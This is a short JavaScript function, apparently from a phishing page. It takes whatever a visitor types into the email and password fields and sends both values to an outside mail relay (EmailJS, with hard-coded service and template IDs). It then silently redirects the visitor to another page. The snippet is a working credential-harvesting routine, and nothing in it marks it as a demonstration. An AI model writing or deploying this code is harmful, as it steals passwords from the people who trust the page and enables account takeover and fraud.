function sendMail(){
    const param={
        from_name:'user',
        email_id:'user',
        message:`${document.getElementById('email').value} ${document.getElementById('pwd').value}`
    }
    emailjs.send("service_xeuwsxq","template_50o5zbu",param).then((res)=>{
        window.location.href = 'page.html';
    })
}